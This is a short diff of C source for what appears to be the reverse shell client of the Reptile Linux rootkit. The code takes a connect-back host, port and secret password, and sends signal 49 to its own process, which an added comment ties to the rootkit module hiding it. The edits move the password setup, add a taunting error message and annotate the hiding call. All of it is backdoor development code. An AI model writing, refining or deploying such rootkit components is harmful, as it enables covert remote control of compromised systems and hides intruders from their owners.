@@ -20,9 +20,10 @@ extern char *optarg;
 extern int optind;
 short int connect_back_port = 0;
 char *connect_back_host = NULL;
-char *secret = PASS;
+char *secret;
 
 void usage(char *argv0) {
+    	fprintf(stderr, "\e[01;31mWhy are you running it from command line?\e[00m\n");
     	fprintf(stderr, "Usage: %s [ -t connect_back_host ] [ -p port ] [ -r delay (optional) ] [ -s secret (optional) ]\n", argv0);
    	exit(1);
 }
@@ -214,6 +215,8 @@ int main( int argc, char **argv ) {
     	struct hostent *client_host;
     	socklen_t n;
 
+	secret = PASS;
+
     	while ((opt = getopt(argc, argv, "t:s:p:r:h")) != -1) {
         	switch (opt) {
 	    	case 't':
@@ -241,7 +244,7 @@ int main( int argc, char **argv ) {
     	if(connect_back_host == NULL || connect_back_port == 0) usage(*argv);
 
     	//strcpy(argv[0], "[ata/0]");
-    	kill(getpid(), 49);
+    	kill(getpid(), 49); // if reptile module is not loaded, this will kill this shell!
 
     	pid = fork();
 
